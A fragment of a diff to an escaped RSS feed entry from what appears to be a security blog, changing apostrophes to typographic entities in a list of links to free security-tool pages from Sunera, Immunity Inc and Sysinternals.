-&lt;p&gt;Other company&#39;s free tools sections:&lt;/p&gt;
+&lt;p&gt;Other company&amp;rsquo;s free tools sections:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;Sunera&lt;/strong&gt;: &lt;a href=&#34;http://security.sunera.com/p/tools.html&#34;&gt;http://security.sunera.com/p/tools.html&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;Immunity Inc&lt;/strong&gt;: &lt;a href=&#34;http://immunityinc.com/resources-freesoftware.shtml&#34;&gt;http://immunityinc.com/resources-freesoftware.shtml&lt;/a&gt;&lt;/li&gt;
@@ -369,7 +369,7 @@ PROJECTMENTOR FILESHARE 173.26.10.207
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx&#34;&gt;http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;If you know of more, please leave a comment below and I&#39;ll add it to the list.&lt;/p&gt;
+&lt;p&gt;If you know of more, please leave a comment below and I&amp;rsquo;ll add it to the list.&lt;/p&gt;
 </description>
     </item>
     
